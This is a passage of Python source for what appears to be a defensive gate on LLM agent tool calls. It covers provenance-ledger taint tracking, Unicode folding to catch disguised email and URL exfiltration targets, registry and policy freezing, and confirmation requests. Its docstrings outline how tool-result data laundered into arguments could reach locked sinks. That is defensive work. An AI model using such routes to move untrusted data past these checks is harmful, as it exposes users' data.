        n = _bounded_nfkc(s, _budget)
    return _finish_canonical(n)


def _canonical_ascii_skeleton(
    s: str,
    _budget: _NFKCWorkBudget | None = None,
    _max_output_chars: int | None = None,
) -> str | None:
    """Fold ASCII-compatible material in a long Unicode blob safely.

    NFKC compatibility decomposition is local to each code point; canonical
    reordering/composition cannot create an ASCII destination by deleting a
    retained non-ASCII character. Fold each distinct code point through an
    input of length one, preserve ASCII output, map removable Unicode
    whitespace to ordinary space, and keep every other non-ASCII output as a
    sentinel. This supports ASCII email/URL containment without normalizing a
    hostile long string as one unit.
    """

    output_limit = (
        MAX_CANONICAL_SKELETON_CHARS
        if _max_output_chars is None
        else min(MAX_CANONICAL_SKELETON_CHARS, _max_output_chars)
    )
    if (
        type(s) is not str
        or type(MAX_CANONICAL_SKELETON_UNIQUE_CODEPOINTS) is not int
        or MAX_CANONICAL_SKELETON_UNIQUE_CODEPOINTS < 1
        or type(MAX_CANONICAL_SKELETON_CHARS) is not int
        or MAX_CANONICAL_SKELETON_CHARS < 1
        or type(output_limit) is not int
        or output_limit < 1
    ):
        return None
    cache: dict[str, str] = {}
    output = io.StringIO()
    output_chars = 0
    previous_was_sentinel = False
    sentinel = "\x00"
    for character in s:
        if character.isascii():
            mapped = character
        else:
            mapped = cache.get(character)
            if mapped is None:
                if len(cache) >= MAX_CANONICAL_SKELETON_UNIQUE_CODEPOINTS:
                    return None
                folded = _bounded_nfkc(character, _budget).casefold()
                mapped_parts: list[str] = []
                mapped_sentinel = False
                for folded_character in folded:
                    if folded_character.isascii():
                        mapped_parts.append(folded_character)
                        mapped_sentinel = False
                    elif _DISGUISE.fullmatch(folded_character):
                        mapped_parts.append(" ")
                        mapped_sentinel = False
                    elif not mapped_sentinel:
                        mapped_parts.append(sentinel)
                        mapped_sentinel = True
                mapped = "".join(mapped_parts)
                cache[character] = mapped
        for mapped_character in mapped:
            is_sentinel = mapped_character == sentinel
            if is_sentinel and previous_was_sentinel:
                continue
            output.write(mapped_character)
            previous_was_sentinel = is_sentinel
            output_chars += 1
            if output_chars > output_limit:
                return None
    return _finish_canonical(output.getvalue())


_EMAIL_RE = re.compile(r"[^@\s]+@[^@\s]+\.[^@\s]+")
_URI_RE = re.compile(
    r"(?:(?:https?|ftp|wss?)://|//|www\.)[^\s]+",
    re.IGNORECASE,
)


def _is_risk_shaped(v: str) -> bool:
    """A value that can author exfiltration: an email address or a URL.
    Containment matching is restricted to these to bound false positives."""
    return bool(_EMAIL_RE.fullmatch(v) or _URI_RE.fullmatch(v))


def _has_risk_shaped_form(
    v: str,
    _budget: _NFKCWorkBudget | None = None,
) -> bool:
    """True when the original or lexical canonical form is an email/URL."""

    if len(v) > MAX_NFKC_INPUT_CHARS and not v.isascii():
        # Callers use this predicate to decide whether a value needs the
        # canonical search index. Over-limit input therefore fails closed.
        return True
    stripped = v.strip()
    return _is_risk_shaped(stripped) or _is_risk_shaped(
        _canonical(stripped, _budget)
    )


def _json_container_token(value: Any) -> tuple[str, str] | None:
    """Return a bounded exact-content token for a plain JSON container."""

    if type(value) is dict:
        kind = "object"
    elif type(value) is list:
        kind = "array"
    else:
        return None
    material = _canonical_json_value(value).encode("ascii")
    return (kind, hashlib.sha256(material).hexdigest())


def _iter_json_taint_values(obj: Any, seen: set[int] | None = None):
    """Yield ``(scalar, is_object_key)`` pairs from one tool result.

    Every JSON object key is itself an exact tool-authored string and may be
    copied into a later locked sink (for example an account identifier used as
    a map key). All keys therefore receive exact type-tagged taint. Only
    risk-shaped key strings join the blob/canonical indexes, so non-exact
    containment remains limited to email/URI values.
    """
    if _json_leaf_token(obj) is not None:
        yield obj, False
        return
    if type(obj) not in (dict, list, tuple):
        return

    seen = set() if seen is None else seen
    identity = id(obj)
    if identity in seen:
        return
    seen.add(identity)
    try:
        if type(obj) is dict:
            for key, value in obj.items():
                if type(key) is str:
                    yield key, True
                yield from _iter_json_taint_values(value, seen)
        else:
            for value in obj:
                yield from _iter_json_taint_values(value, seen)
    finally:
        seen.remove(identity)


def _iter_json_containers(obj: Any, seen: set[int] | None = None):
    """Yield every plain JSON container for exact propagation tracking."""

    if type(obj) not in (dict, list):
        return
    seen = set() if seen is None else seen
    identity = id(obj)
    if identity in seen:
        return
    seen.add(identity)
    try:
        yield obj
        values = obj.values() if type(obj) is dict else obj
        for value in values:
            yield from _iter_json_containers(value, seen)
    finally:
        seen.remove(identity)


def _registered_param_names_for_early_rejection(
    registry: Any,
    tool_name: str,
) -> tuple[bool, frozenset[str]] | None:
    """Return structurally obvious registered names without trusting policy.

    This is only an availability fast path: unknown arguments can be rejected
    before each one is compared with ledger history. Any malformed or
    ambiguous registration falls through to the full gate, which remains the
    authority decision point.
    """

    try:
        if type(registry) is Registry:
            if type(registry.tools) is not dict:
                return None
            if tool_name not in registry.tools:
                return False, frozenset()
            tool = registry.tools.get(tool_name)
            if type(tool) is not Tool or type(tool.params) is not list:
                return None
            if not all(
                type(param) is Param
                and type(param.name) is str
                and bool(param.name)
                for param in tool.params
            ):
                return None
            return True, frozenset(param.name for param in tool.params)
        if type(registry) is _FrozenRegistry:
            if tool_name not in registry.tools:
                return False, frozenset()
            tool = registry.tools.get(tool_name)
            if type(tool) is not _FrozenTool:
                return None
            return True, frozenset(param.name for param in tool.params)
    except Exception:
        return None
    return None


# === drop-in dispatcher (the 5-line integration point) ===================
def dispatch(reg: Registry, ps: PolicySet, tool_use: dict,
             trusted_args: dict | None = None,
             ledger: ProvenanceLedger | None = None) -> Decision:
    """Drop-in wrapper for an LLM-proposed tool call.

    Pass the tool_use block your agent produced (OpenAI / Anthropic format:
    a dict with `name` and `input` keys). `trusted_args` is a small map of
    param -> known-trusted value (e.g. {"to": user.confirmed_email}); any arg
    matching gets provenance='trusted', everything else 'data'.

    Optionally pass a `ProvenanceLedger`. Any argument whose value the ledger
    saw come out of a previous tool result is forced to provenance='data',
    overriding `trusted_args` -- this is what stops a laundered tool result
    from reaching a locked sink. Returns a Decision.
    """
    if type(tool_use) is not dict:
        return Decision(False, "tool call must be a plain dictionary")
    tool = tool_use.get("name")
    args = tool_use.get("input")
    if type(tool) is not str or not tool:
        return Decision(False, "tool call must include a non-empty string name")
    if type(args) is not dict:
        return Decision(False, "tool call input must be a plain dictionary")
    if trusted_args is None:
        trusted_args = {}
    if type(trusted_args) is not dict:
        return Decision(False, "trusted_args must be a plain dictionary")
    if ledger is not None:
        if type(ledger) is not ProvenanceLedger:
            return Decision(False, "ledger must be an exact ProvenanceLedger")
        if ledger.saturated:
            return Decision(
                False,
                "provenance ledger capacity exhausted; start a new session",
            )
    try:
        approved_call, approved_trusted_args = _snapshot_tool_call(
            tool_use,
            trusted_args,
        )
    except Exception:
        return Decision(
            False,
            "tool call and trusted_args must contain only finite, plain JSON values",
        )
    tool = approved_call["name"]
    args = approved_call["input"]
    trusted_args = approved_trusted_args or {}
    early_registration = _registered_param_names_for_early_rejection(
        reg,
        tool,
    )
    if early_registration is not None:
        registered_tool, registered_param_names = early_registration
        if not registered_tool:
            return Decision(
                False,
                f"verb '{_safe_reason_text(tool)}' is not in the registry",
            )
        for name in args:
            if name not in registered_param_names:
                return Decision(
                    False,
                    f"unknown param '{_safe_reason_text(name)}'",
                )
    provenance = {}
    ledger_lookup_budget = _LedgerLookupBudget()
    for n in args:
        matches_trusted = False
        if n in trusted_args:
            try:
                matches_trusted = _same_authority_value(args[n], trusted_args[n])
            except Exception:
                matches_trusted = False
        if not matches_trusted:
            provenance[n] = "data"
            continue
        if ledger is not None and ledger._is_tainted_with_budget(
            args[n],
            ledger_lookup_budget,
        ):
            provenance[n] = "data"            # ledger overrides any dev declaration
        else:
            provenance[n] = "trusted"
    if ledger is not None and ledger.saturated:
        return Decision(
            False,
            "provenance ledger capacity exhausted; start a new session",
        )
    return gate(reg, ps, tool, args, provenance)


@dataclass(frozen=True)
class _FrozenEnumMember:
    canonical_json: str


@dataclass(frozen=True)
class _FrozenParam:
    name: str
    type: str
    enum: tuple[_FrozenEnumMember, ...] | None
    max_len: int | None
    cap: float | int | None
    sink: bool | None
    required: bool
    source_id: int
    enum_source_id: int | None


@dataclass(frozen=True)
class _FrozenTool:
    name: str
    params: tuple[_FrozenParam, ...]
    fn: Callable[..., Any] | None
    risk: Risk | None
    source_id: int
    params_source_id: int


@dataclass(frozen=True)
class _FrozenRegistry:
    tools: Any
    source_tools_id: int


@dataclass(frozen=True, slots=True)
class _FrozenPolicySet:
    policy: Any
    risk: Any
    review: tuple[tuple[str, str], ...]
    confirm: tuple[str, ...]
    risk_inference: Any
    risk_review: tuple[str, ...]
    risk_conflicts: tuple[str, ...]
    registry_binding: str | None
    registry_version: int | None


@dataclass(frozen=True)
class _RegistrationBundle:
    registry: _FrozenRegistry
    policy_set: _FrozenPolicySet
    registration_id: str
    source_state: tuple[int, str]


def _normalize_declared_risk(value: Risk | str | None) -> Risk | None:
    if value is None:
        return None
    if isinstance(value, Risk):
        normalized = value
    elif type(value) is str:
        normalized = Risk(value)
    else:
        raise TypeError("tool risk must be a Risk, string, or None")
    # UNKNOWN is the fail-closed absence of an established application claim,
    # not a declaration that can resolve review. Treating it exactly like an
    # omitted tier preserves the unknown => review-and-confirm invariant.
    return None if normalized is Risk.UNKNOWN else normalized


@dataclass(frozen=True)
class _CallableShape:
    target: FunctionType
    signature: inspect.Signature
    kind: str
    invocation_id: int
    owner_id: int | None


_MISSING_STATIC_ATTRIBUTE = object()


def _raw_callable_shape(
    tool_name: str,
    implementation: Callable[..., Any],
) -> _CallableShape:
    """Inspect only the Python callable that ``**kwargs`` will really enter.

    ``inspect.signature`` normally honors caller-controlled ``__signature__``
    and follows ``__wrapped__``. Neither is execution evidence. Explicit
    ``__signature__`` metadata is rejected and wrapping is deliberately not
    followed. Beta.10 accepts only exact Python functions. Bound methods,
    callable objects, and opaque builtin/extension callables carry receiver or
    implementation state that is not a declared tool argument, so they fail
    closed.
    """

    if isinstance(implementation, functools.partial):
        raise TypeError(
            f"implementation for '{tool_name}' cannot hide bound partial arguments"
        )

    try:
        advertised_signature = inspect.getattr_static(
            implementation,
            "__signature__",
            _MISSING_STATIC_ATTRIBUTE,
        )
    except Exception as exc:
        raise TypeError(
            f"implementation for '{tool_name}' has unsafe signature metadata"
        ) from exc
    if advertised_signature is not _MISSING_STATIC_ATTRIBUTE:
        raise TypeError(
            f"implementation for '{tool_name}' cannot define __signature__"
        )

    if type(implementation) is MethodType:
        raise TypeError(
            f"implementation for '{tool_name}' cannot be a bound method; "
            "materialize receiver state as declared arguments"
        )
    if type(implementation) is not FunctionType:
        raise TypeError(
            f"implementation for '{tool_name}' must be an exact Python function"
        )
    target = implementation
    kind = "function"
    invocation_id = id(implementation)
    owner_id: int | None = None

    if inspect.getattr_static(
        target,
        "__signature__",
        _MISSING_STATIC_ATTRIBUTE,
    ) is not _MISSING_STATIC_ATTRIBUTE:
        raise TypeError(
            f"implementation for '{tool_name}' cannot define __signature__"
        )
    try:
        signature = inspect.signature(target, follow_wrapped=False)
    except (TypeError, ValueError) as exc:
        raise TypeError(
            f"implementation for '{tool_name}' must have an inspectable signature"
        ) from exc

    return _CallableShape(
        target=target,
        signature=signature,
        kind=kind,
        invocation_id=invocation_id,
        owner_id=owner_id,
    )


def _validate_callable_signature(
    tool_name: str,
    param_names: set[str],
    implementation: Callable[..., Any],
) -> None:
    shape = _raw_callable_shape(tool_name, implementation)

    explicit: set[str] = set()
    accepts_extra_keywords = False
    for parameter in shape.signature.parameters.values():
        if parameter.kind in (
            inspect.Parameter.POSITIONAL_ONLY,
            inspect.Parameter.VAR_POSITIONAL,
        ):
            raise TypeError(
                f"implementation for '{tool_name}' cannot use positional-only "
                "or variadic positional parameters"
            )
        if parameter.kind is inspect.Parameter.VAR_KEYWORD:
            accepts_extra_keywords = True
            continue
        explicit.add(parameter.name)

    undeclared = explicit - param_names
    if undeclared:
        names = ", ".join(sorted(undeclared))
        raise ValueError(
            f"implementation for '{tool_name}' consumes undeclared params: {names}"
        )
    unaccepted = param_names - explicit
    if unaccepted and not accepts_extra_keywords:
        names = ", ".join(sorted(unaccepted))
        raise ValueError(
            f"implementation for '{tool_name}' does not accept params: {names}"
        )


def _raw_signature_material(signature: inspect.Signature) -> list[dict[str, Any]]:
    """Binding-relevant raw signature, without invoking arbitrary ``repr``."""

    return [
        {
            "name": parameter.name,
            "kind": parameter.kind.name,
            "has_default": parameter.default is not inspect.Parameter.empty,
        }
        for parameter in signature.parameters.values()
    ]


def _code_content_sha256(code: Any) -> str:
    try:
        encoded = marshal.dumps(code)
    except Exception as exc:
        raise TypeError("registered implementation code cannot be fingerprinted") from exc
    return hashlib.sha256(encoded).hexdigest()


def _freeze_registry(
    registry: Registry,
    *,
    validate_callable: bool = True,
) -> _FrozenRegistry:
    if type(registry.tools) is not dict:
        raise TypeError("registry tools must be a plain dictionary")

    frozen_tools: dict[str, _FrozenTool] = {}
    for registered_name, tool in registry.tools.items():
        if type(registered_name) is not str or not registered_name:
            raise ValueError("registered tool names must be non-empty strings")
        if type(tool) is not Tool:
            raise TypeError("registry entries must be Tool instances")
        if tool.name != registered_name:
            raise ValueError("registry key and Tool.name must match")
        if type(tool.params) is not list:
            raise TypeError("Tool.params must be a plain list")

        params: list[_FrozenParam] = []
        seen_names: set[str] = set()
        for param in tool.params:
            if type(param) is not Param:
                raise TypeError("Tool.params must contain Param instances")
            if type(param.name) is not str or not param.name:
                raise ValueError("parameter names must be non-empty strings")
            if param.name in seen_names:
                raise ValueError(f"duplicate parameter '{param.name}'")
            seen_names.add(param.name)
            if type(param.type) is not str or param.type not in _PARAM_TYPES:
                raise ValueError(
                    "parameter type must be one of: "
                    + ", ".join(sorted(_PARAM_TYPES))
                )
            if param.enum is not None and type(param.enum) is not list:
                raise TypeError("parameter enums must be plain lists")
            if param.type == "enum" and param.enum is None:
                raise ValueError("enum parameters must declare a plain JSON enum")
            if param.type != "enum" and param.enum is not None:
                raise ValueError("enum values require parameter type 'enum'")
            frozen_enum = None
            if param.enum is not None:
                frozen_enum = tuple(
                    _FrozenEnumMember(
                        _canonical_json_value(_snapshot_json_value(member))
                    )
                    for member in param.enum
                )
            if param.max_len is not None and (
                type(param.max_len) is not int or param.max_len < 0
            ):
                raise ValueError("parameter max_len must be a non-negative integer")
            if param.max_len is not None and param.type not in {
                "string",
                "email",
                "uri",
                "object",
                "array",
            }:
                raise ValueError(
                    "parameter max_len requires a string, object, or array type"
                )
            if param.cap is not None and not (
                type(param.cap) in (int, float)
                and (type(param.cap) is int or math.isfinite(param.cap))
            ):
                raise ValueError("parameter cap must be a finite number")
            if param.cap is not None and param.type not in {"number", "integer"}:
                raise ValueError("parameter cap requires a number or integer type")
            if param.sink is not None and type(param.sink) is not bool:
                raise TypeError("parameter sink must be a boolean or None")
            if type(param.required) is not bool:
                raise TypeError("parameter required must be a boolean")
            params.append(
                _FrozenParam(
                    name=param.name,
                    type=param.type,
                    enum=frozen_enum,
                    max_len=param.max_len,
                    cap=param.cap,
                    sink=param.sink,
                    required=param.required,
                    source_id=id(param),
                    enum_source_id=None if param.enum is None else id(param.enum),
                )
            )

        if tool.fn is not None and not callable(tool.fn):
            raise TypeError("registered implementations must be callable or None")
        if validate_callable and tool.fn is None:
            raise TypeError(
                f"registered implementation for '{tool.name}' must be callable"
            )
        if tool.fn is not None and validate_callable:
            _validate_callable_signature(tool.name, seen_names, tool.fn)
        frozen_tools[registered_name] = _FrozenTool(
            name=tool.name,
            params=tuple(params),
            fn=tool.fn,
            risk=_normalize_declared_risk(tool.risk),
            source_id=id(tool),
            params_source_id=id(tool.params),
        )
    return _FrozenRegistry(MappingProxyType(frozen_tools), id(registry.tools))


def _freeze_policy_set(
    policy_set: PolicySet,
    registry: _FrozenRegistry,
) -> _FrozenPolicySet:
    tool_names = set(registry.tools)
    canonical_tool_names = {name: name for name in registry.tools}
    canonical_param_names = {
        name: {param.name: param.name for param in tool.params}
        for name, tool in registry.tools.items()
    }
    if (
        type(policy_set.policy) is not dict
        or not all(type(name) is str for name in policy_set.policy)
        or set(policy_set.policy) != tool_names
    ):
        raise ValueError("policy tools must exactly match the frozen registry")
    if (
        type(policy_set.risk) is not dict
        or not all(type(name) is str for name in policy_set.risk)
        or set(policy_set.risk) != tool_names
    ):
        raise ValueError("risk tools must exactly match the frozen registry")
    if (
        type(policy_set.risk_inference) is not dict
        or not all(type(name) is str for name in policy_set.risk_inference)
        or set(policy_set.risk_inference) != tool_names
    ):
        raise ValueError("risk evidence must exactly match the frozen registry")

    expected_policies: dict[str, dict[str, Policy]] = {}
    expected_risks: dict[str, Risk] = {}
    expected_assessments: dict[str, RiskAssessment] = {}
    expected_review: list[tuple[str, str]] = []
    # Review is also the beta override surface, but a resource-limit review is
    # visibility only. Releasing that lock requires an explicit sink=False
    # declaration and a policy rebuild, not mutation of derived material.
    expected_overridable_review: set[tuple[str, str]] = set()
    expected_confirm: list[str] = []
    expected_risk_review: list[str] = []
    expected_risk_conflicts: list[str] = []
    inference_context = _PolicyInferenceContext()
    for tool_name, tool in registry.tools.items():
        inferred = infer_risk(tool_name, inference_context)
        inference_incomplete = inference_context.inference_incomplete_for(
            tool_name
        )
        conflict = (
            tool.risk is not None
            and inferred.risk is not Risk.UNKNOWN
            and tool.risk is not inferred.risk
        )
        effective_risk = (
            Risk.UNKNOWN
            if tool.risk is None or conflict or inference_incomplete
            else tool.risk
        )
        expected_risks[tool_name] = effective_risk
        expected_assessments[tool_name] = inferred
        if tool.risk is None or conflict or inference_incomplete:
            expected_risk_review.append(tool_name)
        if conflict:
            expected_risk_conflicts.append(tool_name)
        if effective_risk in NEEDS_CONFIRM or (
            conflict and inferred.risk in NEEDS_CONFIRM
        ):
            expected_confirm.append(tool_name)

        expected_policies[tool_name] = {}
        for param in tool.params:
            inferred_policy, confidence = infer_policy(
                param,
                inference_context,
            )
            param_inference_incomplete = (
                inference_context.inference_incomplete_for(param.name)
            )
            if confidence is Confidence.UNCERTAIN:
                if (
                    effective_risk is Risk.READ_ONLY
                    and not param_inference_incomplete
                ):
                    inferred_policy = Policy.TYPED_BOUNDED
                else:
                    expected_review.append((tool_name, param.name))
                    if not param_inference_incomplete:
                        expected_overridable_review.add(
                            (tool_name, param.name)
                        )
            expected_policies[tool_name][param.name] = inferred_policy

    policies: dict[str, Any] = {}
    risks: dict[str, Risk] = {}
    assessments: dict[str, RiskAssessment] = {}
    for tool_name, tool in registry.tools.items():
        raw_params = policy_set.policy[tool_name]
        expected_params = {param.name for param in tool.params}
        if (
            type(raw_params) is not dict
            or not all(type(name) is str for name in raw_params)
            or set(raw_params) != expected_params
        ):
            raise ValueError(
                f"policy params for '{tool_name}' must match its registration"
            )
        normalized_params = {
            name: value if isinstance(value, Policy) else Policy(value)
            for name, value in raw_params.items()
        }
        for param_name, actual_policy in normalized_params.items():
            if (
                (tool_name, param_name) not in expected_overridable_review
                and actual_policy
                is not expected_policies[tool_name][param_name]
            ):
                raise ValueError(
                    "parameter policy may differ from inference only for "
                    "overridable entries in the derived review queue"
                )
        policies[tool_name] = MappingProxyType(normalized_params)
        risk_value = policy_set.risk[tool_name]
        risks[tool_name] = (
            risk_value if isinstance(risk_value, Risk) else Risk(risk_value)
        )
        assessment = policy_set.risk_inference[tool_name]
        if type(assessment) is not RiskAssessment:
            raise TypeError("risk evidence must contain RiskAssessment values")
        if (
            not isinstance(assessment.risk, Risk)
            or not isinstance(assessment.confidence, RiskConfidence)
            or type(assessment.source) is not str
            or type(assessment.mutability) is not str
            or type(assessment.matched_tokens) is not tuple
            or not all(type(token) is str for token in assessment.matched_tokens)
            or type(assessment.review_required) is not bool
        ):
            raise TypeError("risk evidence fields must be immutable typed values")
        assessments[tool_name] = RiskAssessment(
            risk=assessment.risk,
            source=assessment.source,
            confidence=assessment.confidence,
            mutability=assessment.mutability,
            matched_tokens=tuple(assessment.matched_tokens),
            review_required=assessment.review_required,
        )

    queue_values = (
        policy_set.review,
        policy_set.confirm,
        policy_set.risk_review,
        policy_set.risk_conflicts,
    )
    if not all(type(value) is list for value in queue_values):
        raise TypeError("policy queues must be exact built-in lists")
    if not all(
        type(item) is tuple
        and len(item) == 2
        and all(type(name) is str for name in item)
        for item in policy_set.review
    ):
        raise TypeError(
            "parameter review entries must be exact plain-string pairs"
        )
    if not all(
        type(name) is str
        for queue in (
            policy_set.confirm,
            policy_set.risk_review,
            policy_set.risk_conflicts,
        )
        for name in queue
    ):
        raise TypeError("risk queue entries must be exact plain strings")
    if not all(
        item[0] in canonical_tool_names
        and item[1] in canonical_param_names[item[0]]
        for item in policy_set.review
    ):
        raise ValueError("parameter review entries must match the frozen policy")
    review = tuple(
        (
            canonical_tool_names[tool_name],
            canonical_param_names[tool_name][param_name],
        )
        for tool_name, param_name in policy_set.review
    )
    if not all(
        name in canonical_tool_names
        for queue in (
            policy_set.confirm,
            policy_set.risk_review,
            policy_set.risk_conflicts,
        )
        for name in queue
    ):
        raise ValueError("risk lists must reference frozen registered tools")
    confirm = tuple(canonical_tool_names[name] for name in policy_set.confirm)
    risk_review = tuple(
        canonical_tool_names[name] for name in policy_set.risk_review
    )
    risk_conflicts = tuple(
        canonical_tool_names[name] for name in policy_set.risk_conflicts
    )
    if review != tuple(expected_review):
        raise ValueError("parameter review queue must match the derived policy")
    if risks != expected_risks:
        raise ValueError("effective risk must match the registered declaration")
    if assessments != expected_assessments:
        raise ValueError("risk evidence must match the derived name evidence")
    if (
        risk_review != tuple(expected_risk_review)
        or risk_conflicts != tuple(expected_risk_conflicts)
    ):
        raise ValueError("risk review and conflict state must match derived evidence")
    if len(confirm) != len(set(confirm)) or not set(expected_confirm).issubset(confirm):
        raise ValueError("confirmation policy cannot remove a derived requirement")

    frozen_binding, _ = _policy_registry_source(registry)
    return _FrozenPolicySet(
        policy=MappingProxyType(policies),
        risk=MappingProxyType(risks),
        review=review,
        confirm=confirm,
        risk_inference=MappingProxyType(assessments),
        risk_review=risk_review,
        risk_conflicts=risk_conflicts,
        registry_binding=frozen_binding,
        registry_version=None,
    )


def _callable_identity(implementation: Callable[..., Any] | None) -> str:
    """Public content/signature digest; contains no process memory addresses."""

    if implementation is None:
        return "none"
    shape = _raw_callable_shape("<identity>", implementation)
    target = shape.target
    return "sha256:" + _material_sha256(
        {
            "kind": shape.kind,
            "module": target.__module__,
            "qualname": target.__qualname__,
            "code_sha256": _code_content_sha256(target.__code__),
            "signature": _raw_signature_material(shape.signature),
        }
    )


def _private_callable_binding(
    implementation: Callable[..., Any] | None,
) -> dict[str, Any] | None:
    """Live drift token; raw identities stay inside hashed registry material."""

    if implementation is None:
        return None
    shape = _raw_callable_shape("<binding>", implementation)
    return {
        "invocation_id": shape.invocation_id,
        "owner_id": shape.owner_id,
        "code_sha256": _code_content_sha256(shape.target.__code__),
        "signature": _raw_signature_material(shape.signature),
    }


def _registry_material(registry: _FrozenRegistry) -> list[dict[str, Any]]:
    material = [{"source_tools_id": registry.source_tools_id}]
    # Policy inference shares one bounded Unicode-normalization budget across
    # the registry and therefore consumes tools in registration order.  That
    # order is security-relevant material: sorting here would let an in-place
    # dictionary reorder change which identifiers exhaust the budget without
    # changing the registry binding used to reject stale policies.
    for name, tool in registry.tools.items():
        material.append(
            {
                "name": name,
                "params": [
                    {
                        "name": param.name,
                        "type": param.type,
                        "enum": (
                            None
                            if param.enum is None
                            else [member.canonical_json for member in param.enum]
                        ),
                        "max_len": param.max_len,
                        "cap": param.cap,
                        "sink": param.sink,
                        "required": param.required,
                        "source_id": param.source_id,
                        "enum_source_id": param.enum_source_id,
                    }
                    for param in tool.params
                ],
                "risk": None if tool.risk is None else tool.risk.value,
                "executable": _callable_identity(tool.fn),
                "private_executable_binding": _private_callable_binding(tool.fn),
                "source_id": tool.source_id,
                "params_source_id": tool.params_source_id,
            }
        )
    return material


def _risk_assessment_material(assessment: RiskAssessment) -> dict[str, Any]:
    return {
        "risk": assessment.risk.value,
        "source": assessment.source,
        "confidence": assessment.confidence.value,
        "mutability": assessment.mutability,
        "matched_tokens": assessment.matched_tokens,
        "review_required": assessment.review_required,
    }


def _policy_material(policy_set: _FrozenPolicySet) -> dict[str, Any]:
    return {
        "policy": {
            tool: {
                name: policy.value
                for name, policy in sorted(policy_set.policy[tool].items())
            }
            for tool in sorted(policy_set.policy)
        },
        "risk": {
            tool: policy_set.risk[tool].value for tool in sorted(policy_set.risk)
        },
        "review": sorted(policy_set.review),
        "confirm": sorted(policy_set.confirm),
        "risk_inference": {
            tool: _risk_assessment_material(policy_set.risk_inference[tool])
            for tool in sorted(policy_set.risk_inference)
        },
        "risk_review": sorted(policy_set.risk_review),
        "risk_conflicts": sorted(policy_set.risk_conflicts),
        "registry_binding": policy_set.registry_binding,
        "registry_version": policy_set.registry_version,
    }


def _material_sha256(material: Any) -> str:
    encoded = json.dumps(
        material,
        ensure_ascii=True,
        allow_nan=False,
        sort_keys=True,
        separators=(",", ":"),
    ).encode("utf-8")
    return hashlib.sha256(encoded).hexdigest()


def _policy_registry_source(registry: Any) -> tuple[str | None, int | None]:
    """Bind a PolicySet to the exact registration it was derived from."""

    try:
        if isinstance(registry, _FrozenRegistry):
            frozen = registry
            version = None
        elif type(registry) is Registry:
            frozen = _freeze_registry(registry, validate_callable=False)
            version = registry.version
        else:
            return None, None
        return _material_sha256(_registry_material(frozen)), version
    except Exception:
        return None, getattr(registry, "version", None)


def _make_registration_bundle(
    registry: Registry,
    policy_set: PolicySet | None,
) -> _RegistrationBundle:
    frozen_registry = _freeze_registry(registry)
    registry_fingerprint = _material_sha256(_registry_material(frozen_registry))
    if policy_set is not None and (
        policy_set.registry_binding != registry_fingerprint
        or policy_set.registry_version != registry.version
    ):
        raise ValueError(
            "policy_set was built for a different registry registration"
        )
    source_policy = policy_set or build_policy(frozen_registry)
    frozen_policy = _freeze_policy_set(source_policy, frozen_registry)
    registration_id = _material_sha256(
        {
            "registry": _registry_material(frozen_registry),
            "policy": _policy_material(frozen_policy),
        }
    )
    return _RegistrationBundle(
        registry=frozen_registry,
        policy_set=frozen_policy,
        registration_id=registration_id,
        source_state=(registry.version, registry_fingerprint),
    )


def _live_registry_state(registry: Registry) -> tuple[int, str] | None:
    try:
        frozen = _freeze_registry(registry)
        return registry.version, _material_sha256(_registry_material(frozen))
    except Exception:
        return None


def _live_policy_state(
    policy_set: PolicySet,
    registry: _FrozenRegistry,
) -> str | None:
    try:
        frozen = _freeze_policy_set(policy_set, registry)
        return _material_sha256(
            {
                "material": _policy_material(frozen),
                "source_binding": policy_set.registry_binding,
                "source_version": policy_set.registry_version,
                "objects": {
                    "policy_set": id(policy_set),
                    "policy": id(policy_set.policy),
                    "policy_tools": {
                        tool: id(policy_set.policy[tool])
                        for tool in sorted(policy_set.policy)
                    },
                    "risk": id(policy_set.risk),
                    "review": id(policy_set.review),
                    "confirm": id(policy_set.confirm),
                    "risk_inference": id(policy_set.risk_inference),
                    "risk_review": id(policy_set.risk_review),
                    "risk_conflicts": id(policy_set.risk_conflicts),
                },
            }
        )
    except Exception:
        return None


def _canonical_arguments(arguments: dict[str, Any]) -> str:
    """Exact-order, ASCII-only JSON for safe transport to confirmation UIs.

    Object insertion order is preserved because Python keyword invocation can
    observe it.  Numeric spelling also preserves the distinction between
    ``0.0`` and ``-0.0``.  The resulting action commitment therefore describes
    the exact isolated argument value that can be passed to the callable.
    """

    return json.dumps(
        arguments,
        ensure_ascii=True,
        allow_nan=False,
        sort_keys=False,
        separators=(",", ":"),
    )


def _confirmation_request(
    bundle: _RegistrationBundle,
    decision: Decision,
    approved_call: dict[str, Any],
    ledger: ProvenanceLedger,
) -> ConfirmationRequest:
    tool_name = approved_call["name"]
    tool = bundle.registry.tools[tool_name]
    arguments_json = _canonical_arguments(approved_call["input"])
    effective_risk = bundle.policy_set.risk[tool_name]
    executable_id = _callable_identity(tool.fn)
    ledger_version = ledger.version
    action_id = _material_sha256(
        {
            "tool": tool_name,
            "arguments_json": arguments_json,
            "risk": _risk_literal(effective_risk),
            "registration_id": bundle.registration_id,
            "executable_id": executable_id,
            "ledger_version": ledger_version,
        }
    )
    assessment = bundle.policy_set.risk_inference[tool_name]
    return ConfirmationRequest(
        # The callback receives its own frozen decision snapshot. Even trusted
        # callback code using ``object.__setattr__`` must not rewrite the
        # decision later returned by the runner on denial.
        decision=Decision(
            decision.allow,
            decision.reason,
            decision.needs_confirm,
        ),
        tool_name=tool_name,
        arguments_json=arguments_json,
        risk=_risk_literal(effective_risk),
        # A confirmation callback receives primitive evidence snapshots for
        # display, never process-wide Enum members retained by enforcement.
        risk_assessment=_risk_assessment_snapshot(assessment),
        declared_risk=(
            _risk_literal(tool.risk) if tool.risk is not None else None
        ),
        risk_conflict=tool_name in bundle.policy_set.risk_conflicts,
        registration_id=bundle.registration_id,
        executable_id=executable_id,
        ledger_version=ledger_version,
        action_id=action_id,
    )


def _is_async_callable(implementation: Callable[..., Any]) -> bool:
    shape = _raw_callable_shape("<async-check>", implementation)
    return bool(
        shape.target.__code__.co_flags
        & (inspect.CO_COROUTINE | inspect.CO_ASYNC_GENERATOR)
    )


def _is_native_awaitable(value: Any) -> bool:
    """Recognize only interpreter-native awaitables without protocol lookup."""

    if type(value) is CoroutineType:
        return True
    if type(value) is not GeneratorType:
        return False
    return bool(value.gi_code.co_flags & inspect.CO_ITERABLE_COROUTINE)


def _close_awaitable(value: Any) -> None:
    """Close native coroutine/generator awaitables without calling user hooks.

    ``inspect.isawaitable`` also accepts arbitrary objects implementing
    ``__await__``.  Looking up and invoking a ``close`` attribute on such an
    unsupported result would execute one more caller-defined method after the
    runner had already rejected the result.  Native coroutine and generator
    objects have interpreter-provided ``close`` methods and are safe to close
    to suppress resource warnings; other awaitables are rejected untouched.
    """

    try:
